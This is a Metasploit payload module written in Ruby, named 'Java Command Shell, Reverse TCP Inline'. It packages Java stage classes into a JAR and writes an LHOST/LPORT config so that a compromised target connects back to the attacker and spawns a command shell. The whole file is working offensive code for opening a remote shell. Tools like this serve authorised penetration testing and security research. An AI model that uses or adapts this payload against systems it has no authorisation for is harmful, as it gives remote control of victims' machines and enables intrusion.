##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Java
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Java Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => [
          'mihi', # all the hard work
          'egypt' # msf integration
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => [ 'java' ],
      'Arch'          => ARCH_JAVA,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
    @class_files = [
      [ "metasploit", "Payload.class" ],
      [ "javapayload", "stage", "Stage.class" ],
      [ "javapayload", "stage", "StreamForwarder.class" ],
      [ "javapayload", "stage", "Shell.class" ],
    ]
  end

  def generate_jar(opts={})
    jar = Rex::Zip::Jar.new
    @class_files.each do |path|
      1.upto(path.length - 1) do |idx|
        full = path[0,idx].join("/") + "/"
        if !(jar.entries.map{|e|e.name}.include?(full))
          jar.add_file(full, '')
        end
      end
      fd = File.open(File.join( Msf::Config.data_directory, "java", path ), "rb")
      data = fd.read(fd.stat.size)
      jar.add_file(path.join("/"), data)
      fd.close
    end
    jar.build_manifest(:main_class => "metasploit.Payload")
    jar.add_file("metasploit.dat", config)

    jar
  end

  def config
    c =  ""
    c << "LHOST=#{datastore["LHOST"]}\n" if datastore["LHOST"]
    c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
    # Magical, means use stdin/stdout.  Used for debugging
    #c << "LPORT=0\n"
    c << "EmbeddedStage=Shell\n"

    c
  end

end
